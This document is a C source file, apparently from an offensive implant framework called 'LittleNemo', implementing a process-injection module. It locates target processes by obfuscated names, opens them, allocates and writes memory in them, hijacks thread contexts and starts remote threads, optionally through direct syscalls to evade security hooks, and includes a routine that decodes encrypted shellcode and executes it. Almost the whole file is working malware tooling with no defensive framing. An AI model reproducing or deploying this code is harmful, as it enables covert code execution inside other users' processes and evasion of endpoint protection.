@@ -1,0 +1,444 @@
+#!name##LilNemo_CandyInjector_C
+#!itemType##sfile
+#!info##LittleNemo Candy Injector C file.
+#!lang##c
+#!addNameComp##True
+
+
+#include "lil_nemo_candy_injector.h"
+
+
+DWORD lil_nemo_candy_raw_find_proc_pid(char *process_name, pLIL_NEMO_BAG bag) {
+    if (bag->raw_k32[0] == 0) {
+        return 0;
+    }
+    void *k32addr = bag->find_dll(bag->raw_k32, bag);
+    if (!k32addr) {
+        return 0;
+    }
+    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
+    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
+    if (my_proc == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid = 0;
+    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32addr, bag);
+    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32addr, bag);
+    if (proc_first(my_proc, &entry)) {
+        do {
+            if (strcmp(process_name, entry.szExeFile) == 0) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (proc_next(my_proc, &entry));
+    }
+    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
+    close_handle(my_proc);
+    return pid;
+}
+
+DWORD lil_nemo_candy_find_proc_pid(uint16_t *process_name, pLIL_NEMO_BAG bag) {
+    if (bag->raw_k32[0] == 0) {
+        return 0;
+    }
+    void *k32addr = bag->find_dll(bag->raw_k32, bag);
+    if (!k32addr) {
+        return 0;
+    }
+    pNEMO_BALLOC_MEM bmem = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
+    pNEMO_BALLOC_MEM bmem2 = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
+    uint16_t *extract_name = NemoExtractName(process_name, bag->ekey, bmem);
+
+    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
+    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
+    if (my_proc == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid = 0;
+    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32addr, bag);
+    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32addr, bag);
+    if (proc_first(my_proc, &entry)) {
+        do {
+            BALLOC_empty_memory(bmem2);
+            uint16_t *en_process_name = NemoConvertStr(entry.szExeFile, bag->ekey, bmem2);
+            if (NemoCompareBag(extract_name, en_process_name) == 1) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (proc_next(my_proc, &entry));
+    }
+    free(bmem->ptr);
+    free(bmem);
+    free(bmem2->ptr);
+    free(bmem2);
+    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
+    close_handle(my_proc);
+    return pid;
+}
+
+DWORD lil_nemo_candy_find_proc2(NNType_NemoFoodFuncList food_process_list, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    uint16_t **proc_names = malloc(LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE * sizeof(uint16_t*));
+    memset(proc_names, 0, LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE * sizeof(uint16_t*));
+    pLIL_NEMO_FOOD_LIST p_names = food_process_list(proc_names, LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE);
+    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32, bag);
+    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
+    if (my_proc == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid = 0;
+    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32, bag);
+    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32, bag);
+    pNEMO_BALLOC_MEM bmem = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
+    pNEMO_BALLOC_MEM bmem2 = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
+    int tar_proc_id = 0;
+    uint16_t *tar_proc_name;
+    if (proc_first(my_proc, &entry)) {
+        do {
+            BALLOC_empty_memory(bmem2);
+            uint16_t *en_process_name = NemoConvertStr(entry.szExeFile, bag->ekey, bmem2);
+            tar_proc_id = 0;
+            while (p_names->list_ptr[tar_proc_id] != 0) {
+                BALLOC_empty_memory(bmem);
+                tar_proc_name = NemoExtractName(p_names->list_ptr[tar_proc_id], bag->ekey, bmem);
+                if (NemoCompareBag(en_process_name, tar_proc_name) == 1) {
+                    pid = entry.th32ProcessID;
+                    break;
+                }
+                tar_proc_id++;
+            if (pid != 0) {
+                break;
+            }
+            }
+        } while (proc_next(my_proc, &entry));
+    }
+    free(proc_names);
+    p_names->clear(p_names);
+    free(bmem->ptr);
+    free(bmem);
+    free(bmem2->ptr);
+    free(bmem2);
+    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32, bag);
+    close_handle(my_proc);
+    return pid;
+}
+
+DWORD lil_nemo_candy_find_thread_tid(DWORD proc_pid, pLIL_NEMO_BAG bag) {
+    if (bag->raw_k32[0] == 0) {
+        return 0;
+    }
+    void *k32addr = bag->find_dll(bag->raw_k32, bag);
+    if (!k32addr) {
+        return 0;
+    }
+    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
+    HANDLE my_th = snap(TH32CS_SNAPTHREAD, 0);
+    if (my_th == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+    THREADENTRY32 entry;
+    entry.dwSize = sizeof(THREADENTRY32);
+    DWORD tid = 0;
+    NTypeThread32First th_first = bag->get_func2(lil_nemo_food_Thread32First, k32addr, bag);
+    NTypeThread32Next th_next = bag->get_func2(lil_nemo_food_Thread32Next, k32addr, bag);
+    if (th_first(my_th, &entry)) {
+        do {
+            if (entry.th32OwnerProcessID == proc_pid) {
+                tid = entry.th32ThreadID;
+                break;
+            }
+        } while (th_next(my_th, &entry));
+    }
+    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
+    close_handle(my_th);
+    return tid;
+}
+
+HANDLE lil_nemo_candy_open_process(DWORD proc_pid, ACCESS_MASK acc_mask, pLIL_NEMO_BAG bag) {
+    void *ntdll = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        ntdll = bag->addr_ntdll;
+    }
+    else {
+        if (bag->raw_ntdll[0] == 0) {
+            return 0;
+        }
+        ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    }
+
+    if (!ntdll) {
+        return 0;
+    }
+    NTypeNtOpenProcess op_proc = bag->get_func2(lil_nemo_food_NtOpenProcess, ntdll, bag);
+    if (!op_proc) {
+        return 0;
+    }
+    OBJECT_ATTRIBUTES oattr;
+    InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);
+    HANDLE hproc;
+    CLIENT_ID cliid;
+    cliid.UniqueProcess = (PVOID)(uintptr_t)proc_pid;
+    cliid.UniqueThread = 0;
+    if (bag->FLAG_use_syscall > 0) {
+        nemo_ssn_ntopenprocess = bag->get_syscall2(op_proc);
+        bag->last_ntstatus = NemoCandy_NtOpenProcess(&hproc, acc_mask, &oattr, &cliid);
+        return hproc;
+    }
+    else {
+        bag->last_ntstatus = op_proc(&hproc, acc_mask, &oattr, &cliid);
+        return hproc;
+    }
+}
+
+PVOID lil_nemo_candy_allocate_memory(HANDLE proc, SIZE_T mem_size, ULONG allocation_type, ULONG mem_flags, pLIL_NEMO_BAG bag) {
+    void *ntdll = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        ntdll = bag->addr_ntdll;
+    }
+    else {
+        if (bag->raw_ntdll[0] == 0) {
+            return 0;
+        }
+        ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    }
+    if (!ntdll) {
+        return 0;
+    }
+    SIZE_T pay_size = mem_size;
+    PVOID mem_addr = NULL;
+    NTypeNtAllocateVirtualMemory alloc_mem = bag->get_func2(lil_nemo_food_NtAllocateVirtualMemory, ntdll, bag);
+    if (!alloc_mem) {
+        return 0;
+    }
+    if (bag->FLAG_use_syscall == 1) {
+        nemo_ssn_NtAllocateVirtualMemory = bag->get_syscall2(alloc_mem);
+        bag->last_ntstatus = NemoCandy_NtAllocateVirtualMemory(proc, &mem_addr, 0, &pay_size, allocation_type, mem_flags);
+    }
+    else {
+        bag->last_ntstatus = alloc_mem(proc, &mem_addr, 0, &pay_size, allocation_type, mem_flags);
+    }
+    return mem_addr;
+}
+
+SIZE_T lil_nemo_candy_write_memory(HANDLE proc, PVOID mem_addr, PVOID buffer, SIZE_T buff_size, pLIL_NEMO_BAG bag) {
+    void *ntdll = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        ntdll = bag->addr_ntdll;
+    }
+    else {
+        if (bag->raw_ntdll[0] == 0) {
+            return 0;
+        }
+        ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    }
+    if (!ntdll) {
+        return 0;
+    }
+    SIZE_T bytes_wr;
+    NTypeNtWriteVirtualMemory write_mem = bag->get_func2(lil_nemo_food_NtWriteVirtualMemory, ntdll, bag);
+    if (!write_mem) {
+        return 0;
+    }
+    if (bag->FLAG_use_syscall == 1) {
+        nemo_ssn_NtWriteVirtualMemory = bag->get_syscall2(write_mem);
+        bag->last_ntstatus = NemoCandy_NtWriteVirtualMemory(proc, mem_addr, buffer, buff_size, &bytes_wr);
+    }
+    else {
+        bag->last_ntstatus = write_mem(proc, mem_addr, buffer, buff_size, &bytes_wr);
+    }
+    return bytes_wr;
+}
+
+BOOL lil_nemo_candy_suspend_thread(HANDLE th_handle, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeSuspendThread sus_th = bag->get_func2(lil_nemo_food_SuspendThread, k32, bag);
+    return sus_th(th_handle);
+}
+
+BOOL lil_nemo_candy_resume_thread(HANDLE th_handle, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeResumeThread resume = bag->get_func2(lil_nemo_food_ResumeThread, k32, bag);
+    if (!resume) {
+        return 0;
+    }
+    return resume(th_handle);
+}
+
+HANDLE lil_nemo_candy_open_thread(DWORD pid, DWORD th_id, ACCESS_MASK acc_mask, pLIL_NEMO_BAG bag) {
+    void *ntdll = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        ntdll = bag->addr_ntdll;
+    }
+    else {
+        if (bag->raw_ntdll[0] == 0) {
+            return 0;
+        }
+        ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    }
+    if (!ntdll) {
+        return 0;
+    }
+    NTypeNtOpenThread open_th = bag->get_func2(lil_nemo_food_NtOpenThread, ntdll, bag);
+    if (!open_th) {
+        return 0;
+    }
+    HANDLE th_handle;
+    OBJECT_ATTRIBUTES ob_att;
+    InitializeObjectAttributes(&ob_att, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    CLIENT_ID cli_id;
+    cli_id.UniqueProcess = (PVOID)(uintptr_t)pid;
+    cli_id.UniqueThread = (PVOID)(uintptr_t)th_id;
+    bag->last_ntstatus = open_th(&th_handle, acc_mask, &ob_att, &cli_id);
+    return th_handle;
+}
+
+BOOL lil_nemo_candy_get_thread_context(HANDLE th_handle, LPCONTEXT ctx, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeGetThreadContext get_ctx = bag->get_func2(lil_nemo_food_GetThreadContext, k32, bag);
+    if (!get_ctx) {
+        return 0;
+    }
+    return get_ctx(th_handle, ctx);
+}
+
+BOOL lil_nemo_candy_set_thread_context(HANDLE th_handle, LPCONTEXT ctx, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeSetThreadContext set_ctx = bag->get_func2(lil_nemo_food_SetThreadContext, k32, bag);
+    if (!set_ctx) {
+        return 0;
+    }
+    return set_ctx(th_handle, ctx);
+}
+
+
+HANDLE lil_nemo_candy_create_remote_thread(HANDLE proc, PVOID start_func, PVOID args, ULONG create_flag, pLIL_NEMO_BAG bag) {
+    void *ntdll = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        ntdll = bag->addr_ntdll;
+    }
+    else {
+        if (bag->raw_ntdll[0] == 0) {
+            return 0;
+        }
+        ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    }
+    if (!ntdll) {
+        return 0;
+    }
+    NTypeNtCreateThreadEx cr_th = bag->get_func2(lil_nemo_food_NtCreateThreadEx, ntdll, bag);
+    HANDLE my_th;
+    if (bag->FLAG_use_syscall == 1) {
+        nemo_ssn_NtCreateThreadEx = bag->get_syscall2(cr_th);
+        bag->last_ntstatus = NemoCandy_NtCreateThreadEx(&my_th, THREAD_ALL_ACCESS, 0, proc, start_func, args, create_flag, 0, 0, 0, 0);
+    }
+    else {
+        bag->last_ntstatus = cr_th(&my_th, THREAD_ALL_ACCESS, 0, proc, start_func, args, create_flag, 0, 0, 0, 0);
+    }
+    return my_th;
+}
+
+pLNC_PAYLOAD_SHELLCODE_BASIC lil_nemo_candy_prepare_shellcode(NNType_CandyScodeFunc raw_scode, uint16_t *ekey, pLIL_NEMO_BAG bag) {
+    pLNC_PAYLOAD_SHELLCODE_BASIC scode = raw_scode();
+    if (ekey == 0) {
+        ekey = bag->ekey;
+    }
+    int key_id = 0;
+    while (ekey[key_id] != 0) {
+        scode->key[key_id] = ekey[key_id];
+        key_id++;
+    }
+    scode->s_size = sizeof(LNC_PAYLOAD_SHELLCODE_BASIC);
+    return scode;
+}
+
+// --------------------- Inject Fnctions ----------------------------
+
+
+void lil_nemo_candy_func_inject_shellcode(pLNC_PAYLOAD_SHELLCODE_BASIC scode) {
+    int kid = 0;
+    unsigned char *target = (unsigned char*)scode->target_ptr;
+    for (int i=0; i<scode->shellcode_size; i++) {
+        if (scode->key[kid] == 0) {
+            kid = 0;
+        }
+        target[i] = scode->shellcode[i] - scode->key[kid];
+        kid++;
+    }
+    void (*ready)(void) = scode->target_ptr;
+    ready();
+    return;
+}
+
+void lil_nemo_candy_func_inject_shellcode_end(void) {
+    return;
+}
+
+
+
+
